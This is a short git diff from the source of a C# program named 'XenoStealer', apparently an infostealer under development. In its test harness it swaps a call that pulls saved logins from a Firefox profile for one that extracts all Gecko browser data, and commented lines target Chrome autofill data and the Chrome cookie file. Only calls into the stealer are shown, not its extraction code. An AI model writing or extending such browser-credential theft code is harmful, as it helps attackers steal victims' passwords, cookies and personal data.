@@ -22,8 +22,8 @@ namespace XenoStealer
             //
             //var t=Chromium.GetAutoFills(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default");
 
-            GeckoDecryptor a = new GeckoDecryptor(Configuration.GeckoLibraryPaths["Firefox"]);
-            var g =Gecko.GetLogins(@"C:\Users\moom825\AppData\Roaming\Mozilla\Firefox\Profiles\q2pa8ef9.default-release", a);
+            //GeckoDecryptor a = new GeckoDecryptor(Configuration.GeckoLibraryPaths["Firefox"]);
+            var t=Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
             var y = 0;
             //Utils.GetProcessLockingFile(@"C:\Users\moom825\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies", out var asd);
 
